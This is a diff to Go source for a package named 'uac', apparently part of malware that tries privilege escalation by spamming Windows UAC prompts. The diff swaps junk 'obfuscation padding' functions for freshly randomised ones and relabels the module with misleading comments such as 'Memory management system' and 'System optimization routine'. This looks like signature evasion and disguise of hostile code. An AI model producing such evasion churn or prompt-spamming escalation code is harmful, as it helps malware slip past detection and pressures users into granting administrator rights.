@@ -1,6 +1,6 @@
 // OBFUSCATED
+// Memory management system
 // System optimization routine
-// Performance enhancement module
 package uac
 
 import (
@@ -214,38 +214,32 @@ func AttemptPrivilegeEscalation() bool {
 	return SpamUACPrompts()
 }
 
-
-
 // Obfuscation padding
-func obf_71826() {
-    _ = 1836
-    var _ = "EL4W8Uqanu3fU90CUhRa8vwYabPtGrCNcKWbGqKjKMWjrH6q6M"
+func obf_65343() {
+	_ = 435
+	var _ = "OtbTn1pqqZocAryByZ0KzV6hxfxAQWKbFM94L16YTG3OaqdWTp"
 }
 
-
 // Obfuscation padding
-func obf_22494() {
-    _ = 9023
-    var _ = "DKGuJGtlngeJ86I1THZtFZtUJEgFUF9VCVgHY4fYGguWT2NjUu"
+func obf_74313() {
+	_ = 871
+	var _ = "hubZLY48zOwm9LUR8mSSU3iLfkIZN4kupQIusN4UbplDGtslmy"
 }
 
-
 // Obfuscation padding
-func obf_61845() {
-    _ = 7264
-    var _ = "cYIAgvGUtBWqfVSCrGM4Ae9WOQlQvPzuYvufDjwbBshyX4rIu3"
+func obf_52237() {
+	_ = 4256
+	var _ = "oF6opkcEi7mZMLkNql4TtHyxz9RC2LLLwm4LZGAvtQ8aIFtoDM"
 }
 
-
 // Obfuscation padding
-func obf_41469() {
-    _ = 6876
-    var _ = "upBSSvtv9nrRgMnfyZHh9nXXurqRFV1pgpjgpw8V8SmcCFaUya"
+func obf_74156() {
+	_ = 8329
+	var _ = "PvmyFfCMKQtMvDmXxBhWSxxW64i8lvrclQUTl52rSOAlkGVSZX"
 }
 
-
 // Obfuscation padding
-func obf_40071() {
-    _ = 2443
-    var _ = "mr84rLulNemZQ8jwAr6MtOzsa464OoYFspMWk8vryXtdDev8Z4"
+func obf_43479() {
+	_ = 2602
+	var _ = "1nvnN4W3GvVOkdOKw29VHr2pnkYIuwOEvFQsXp9EisVIwoh02s"
 }
